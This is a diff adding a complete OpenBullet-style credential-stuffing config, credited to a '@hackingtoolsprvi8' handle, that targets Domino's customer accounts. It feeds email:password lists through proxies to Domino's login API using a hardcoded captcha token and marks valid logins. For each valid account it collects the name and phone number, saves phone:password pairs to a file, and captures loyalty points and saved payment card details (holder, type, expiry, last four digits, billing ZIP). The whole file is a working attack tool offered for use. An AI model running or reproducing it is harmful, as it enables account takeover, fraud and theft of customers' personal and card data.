@@ -1,0 +1,207 @@
+[SETTINGS]
+{
+  "Name": "Dominos(@hackingtoolsprvi8)",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-07-03T14:58:01.2480882+01:00",
+  "AdditionalInfo": "",
+  "Author": "@hackingtoolsprvi8",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#LOGIN-API REQUEST POST "https://authproxy.dominos.com/auth-proxy-service/login" 
+  CONTENT "client_id=iOS-rm&scope=customer:card:read customer:profile:read:extended customer:orderHistory:read customer:card:update customer:profile:read:basic customer:loyalty:read customer:orderHistory:update customer:card:create customer:loyaltyHistory:read order:place:cardOnFile customer:card:delete customer:orderHistory:create customer:profile:update&password=<PASS>&validator_id=VoldemortCredValidatorCustID&grant_type=password&username=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: authproxy.dominos.com" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=utf-8" 
+  HEADER "Dpz-Market: UNITED_STATES" 
+  HEADER "Accept: */*" 
+  HEADER "X-Dpz-Adid: 00000000-0000-0000-0000-000000000000" 
+  HEADER "Accept-Language: en-CA,en-US;q=0.9,en;q=0.8" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 468" 
+  HEADER "Dpz-Language: en" 
+  HEADER "User-Agent: DominosiOS/9.2.1 (iOS 15.4.1; iPhone; en)" 
+  HEADER "X-Dpz-D: D992758E-591C-45FD-918F-9D7020805A19" 
+  HEADER "X-Dpz-Captcha: google-recaptcha-v3-enterprise-iosv2;token=03AGdBq24gLzWScYH21hrzu1sa4rWcUy0VPh5fYA6ZSDqbLTuWb1APmsMGwL6Q2-o2L_r62bIm-jtvC0034dBp27PDpy2bN0Gp-yg408T1tSB8avlCVnlWS-2Qrnh9-2JIO9mR5OfRlMp6MqHNO5udUQQY01pYr58V6SNYFb9W_kfmnOeQRZeqjT3FmDzu5Orjn8zywL3HI9A2jq1c3-SOyRTbBwg6Miys85X77FuzEUU-THKTO7Q7xDuSIg5bP8utSc9MrUYvgw6sx1_6jmMs6Wo5CEtrx51BPawwCwSzqe3VJcqPuN1T2-PEU2r6gJ0QALV9C7twWnND9dkDMN_6OejpAYOpFSIuVweP484I74u3iXl75U8OgNztNCCdMCvDiCeEPDNAja60lEeEJk1apM1Q9nNy71VxZzLcI94QhQIiAbnANTQi_atNl0wD0OJHBAAxPeWLn04mYrmMgWIyGemGJTyUN6kknyRrWxUyY4dLR08wxird2bsDRKkP86HDeftpBHvAAHqG8RCtbl5mRIx2iP_DnnVZ-9MypANYGksuAP-8GRWzg5KxRicjmsA8oxxuThS7kdNDQr-6DIW_BUVuAw9lGhqHU5lzfPS1otgm_4Q-dTMnVF8GzDO_ezalzC6YJdVNcI-TZi6CwnSpJkTPSBD-pOffSPA14FPT73w1YkyC9e1ZvE4nSrGjWbyvRC2ylAQoS8EoytZxvGYJkVtVR078UzwrfY8xnEOyMsSjMbGadQ-8ujE45SbxQDmZVeheadMjuS4u4ZKZipJoAz_30ej2OWpWkkTyBz4LITRZyUtGdVI9m6LvZwHJZfX8xFFql545J5zqW0Sx8rsGICsrHmIlhOHtvCZl16OqKxAYzBHrEeC7CTU58_dQNKUdwsu0FRtwreqVNMz_s2zU8B3nNnvU9-gJm-YaL5OFzB-MXas2lrwJmwKGIeIDx0LhoHT1qbGxO1ScqJY3rsxQUHJRFeTypSMjfMBcqECgoHWxnjRmLDI0O8zZpaVdAbAR_Ct35W0s2Sh0UV5gg_1oyG2DOtQGwgmdBY5ZQv9Omf_gpy1CkYQMlfXtbvz7wgb0GZq-P3743XV26zDHkXMynnE_kD8Ue0Mf8oe6_tsjgj0jyhcEpmIf7XAJhZIPHsY3hG72oLHido5TSlerefWAkAx0VGksmI_RBd8oH00kWoK5C5AvJ3fmeKTzW2qlnMOcBMR44goTgYgyOXrpTGnO1VbLaNYLPPiyDjyyEuFdmomdF8_7KLFU4-UdgdFDhfHqQYEQGaUCSeNou_89iHBTg_0ahv_sWdhWf5rtFsigDnKyD7cmprgGPYN88tAG765HWHq1diB_LYPTBIQ9VUxdrmdCskfdE2Hv0oDNYHm8MDsymVG2Hnazw6tMA_ShetIu_cPLrY5g9yatj-VDnTpwV8VmmSMi_1SIwZjA0YzuwB_yzWSE_wj3QNE34-u7731Rb9nLnTM1BvI-;action=login" 
+  HEADER "Connection: close" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "invalid_grant" 
+    KEY "We didn't recognize the username or password you entered." 
+    KEY "<RESPONSECODE>" Contains "401" 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" Contains "429" 
+    KEY "<RESPONSECODE>" Contains "500" 
+    KEY "<RESPONSECODE>" Contains "403" 
+
+#TK PARSE "<SOURCE>" JSON "access_token" -> VAR "TK" 
+
+#RTK PARSE "<SOURCE>" JSON "refresh_token" -> VAR "RTK" 
+
+#POST_LOGIN REQUEST POST "https://order.dominos.com/power/login" 
+  CONTENT "loyaltyIsActive=true&rememberMe=false&gRecaptchaResponse=" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "authorization: Bearer <TK>" 
+  HEADER "cache-control: no-cache" 
+  HEADER "content-length: 57" 
+  HEADER "content-type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "dpz-language: en" 
+  HEADER "dpz-market: UNITED_STATES" 
+  HEADER "market: UNITED_STATES" 
+  HEADER "origin: https://order.dominos.com" 
+  HEADER "pragma: no-cache" 
+  HEADER "referer: https://order.dominos.com/assets/build/xdomain/proxy.html" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36" 
+  HEADER "x-dpz-d: 61aa0542-b112-4d8b-82c7-6655f9acfb2a" 
+
+#CUSID PARSE "<SOURCE>" JSON "CustomerID" -> VAR "CUSID" 
+
+#first PARSE "<SOURCE>" JSON "FirstName" -> VAR "first" 
+
+#Name PARSE "<SOURCE>" JSON "LastName" CreateEmpty=FALSE -> CAP "Name" "<first> " "" 
+
+#Phone_Number PARSE "<SOURCE>" JSON "Phone" CreateEmpty=FALSE -> CAP "Phone Number" "+1" "" 
+
+UTILITY File "NumberPass Combos USA.txt" AppendLines "<Phone Number>:<PASS>" 
+
+#GET_CUSTOMER REQUEST GET "https://order.dominos.com/power/customer/<CUSID>/loyalty?_=<CT>" 
+  
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "authorization: Bearer <TK>" 
+  HEADER "cache-control: no-cache" 
+  HEADER "content-type: application/json; charset=utf-8" 
+  HEADER "dpz-language: en" 
+  HEADER "dpz-market: UNITED_STATES" 
+  HEADER "market: UNITED_STATES" 
+  HEADER "pragma: no-cache" 
+  HEADER "referer: https://order.dominos.com/assets/build/xdomain/proxy.html" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36" 
+  HEADER "x-dpz-d: 61aa0542-b112-4d8b-82c7-6655f9acfb2a" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "AccountStatus\":\"ACTIVE" 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "<SOURCE>" DoesNotContain "AccountStatus\":\"ACTIVE" 
+
+#AccountStatus PARSE "<SOURCE>" JSON "AccountStatus" CreateEmpty=FALSE -> CAP "AccountStatus" 
+
+#memberSince PARSE "<SOURCE>" JSON "EnrollDate" CreateEmpty=FALSE -> CAP "memberSince" 
+
+#Points_Balance PARSE "<SOURCE>" JSON "VestedPointBalance" CreateEmpty=FALSE -> CAP "Points Balance" 
+
+#Points_Expiry PARSE "<SOURCE>" JSON "BasePointExpirationDate" CreateEmpty=FALSE -> CAP "Points Expiry" 
+
+#CT FUNCTION CurrentUnixTime -> VAR "CT" 
+
+#GET_PAYMENTS REQUEST GET "https://order.dominos.com/power/customer/<CUSID>/card?rememberMe=false&_=<CT>" 
+  
+  HEADER ": scheme: https" 
+  HEADER "accept: application/vnd.dominos.customer.card+json;version=1.0" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "authorization: Bearer <TK>" 
+  HEADER "cache-control: no-cache" 
+  HEADER "content-type: application/json" 
+  HEADER "dpz-language: en" 
+  HEADER "dpz-market: UNITED_STATES" 
+  HEADER "market: UNITED_STATES" 
+  HEADER "pragma: no-cache" 
+  HEADER "referer: https://order.dominos.com/assets/build/xdomain/proxy.html" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36" 
+  HEADER "x-dpz-d: 61aa0542-b112-4d8b-82c7-6655f9acfb2a" 
+  HEADER "x-return-forbidden-status: true" 
+
+#CardHolder PARSE "<SOURCE>" JSON "nameOnCard" CreateEmpty=FALSE -> CAP "CardHolder" 
+
+#cardType PARSE "<SOURCE>" JSON "cardType" CreateEmpty=FALSE -> CAP "cardType" 
+
+#expM PARSE "<SOURCE>" JSON "expirationMonth" -> VAR "expM" 
+
+#expY PARSE "<SOURCE>" JSON "expirationYear" -> VAR "expY" 
+
+#ccExpiry FUNCTION Constant "<expM>|<expY>" -> CAP "ccExpiry" 
+
+#cc_lastFour PARSE "<SOURCE>" JSON "lastFour" CreateEmpty=FALSE -> CAP "cc_lastFour" 
+
+#cc_billingZip PARSE "<SOURCE>" JSON "billingZip" CreateEmpty=FALSE -> CAP "cc_billingZip" 
+
+#isCardExpired PARSE "<SOURCE>" JSON "isExpired" CreateEmpty=FALSE -> CAP "isCardExpired" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "<isCardExpired>" Contains "False" 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "<isCardExpired>" Contains "True" 
+
+FUNCTION Constant "@hackingtoolsprvi8" -> VAR "Config By" 
+
